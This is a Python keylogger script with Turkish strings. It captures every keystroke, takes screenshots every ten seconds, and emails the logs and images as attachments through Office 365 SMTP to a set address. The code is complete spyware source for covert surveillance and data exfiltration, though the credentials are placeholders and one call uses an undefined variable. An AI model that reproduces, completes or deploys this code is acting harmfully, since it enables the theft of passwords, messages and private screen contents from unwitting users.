from email.mime.text import MIMEText
import time
import threading
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

count = 0
keys = []
record_file = '/Users/mehmetsalihogun/Desktop/Projeler/BSG/keylogger/'
screenshot_enabled = True
time_ss = 10

sender_email = '..'
receiver_email = '..'
email_password = '..'
subject = 'Keylogger Rapor'
body = 'Keylogger kayıtları ve ekran görüntüleri ektedir.'
attachments = []

def send_outlook_email(sender_email, receiver_email, email_password, subject, body, attachments):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    for attachment in attachments:
        part = MIMEBase('application', 'octet-stream')
        with open(attachment, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
        msg.attach(part)

    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.office365.com', 587)
        server.starttls()
        server.login(sender_email, email_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("E-posta gönderildi!")
    except Exception as e:
        print(f"Hata oluştu: {e}")

def on_press(key):
    global count, keys
    count += 1
    keys.append(key)

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(f'{record_file}text.txt', "a", encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

        
        attachments.append(f'{record_file}text.txt')


def take_screenshot():
    while screenshot_enabled:
        try:
            ekran_goruntusu = ImageGrab.grab()
            zaman_etiketi = time.strftime("%Y%m%d%H%M%S")
            file_name = f'{record_file}ekran_{zaman_etiketi}.png'
            ekran_goruntusu.save(file_name)
            attachments.append(file_name)  
            print(f'Ekran görüntüsü kaydedildi: {file_name}')
            time.sleep(time_ss)
        except Exception as e:
            print(f'Hata: {str(e)}')

def on_release(key):
    global screenshot_enabled
    if key == Key.esc:
        screenshot_enabled = False
        send_outlook_email(sender_email, receiver_email, app_password, subject, body, attachments) 
        print("exited")
        return False

if __name__ == "__main__":
    try:
        key_listener = Listener(on_press=on_press, on_release=on_release)
        key_listener.start()

        screenshot_thread = threading.Thread(target=take_screenshot)
        screenshot_thread.start()

        time.sleep(3600)

        key_listener.stop() 
        screenshot_thread.join()  

    except Exception as e:
        print(f"Ana hata: {str(e)}")
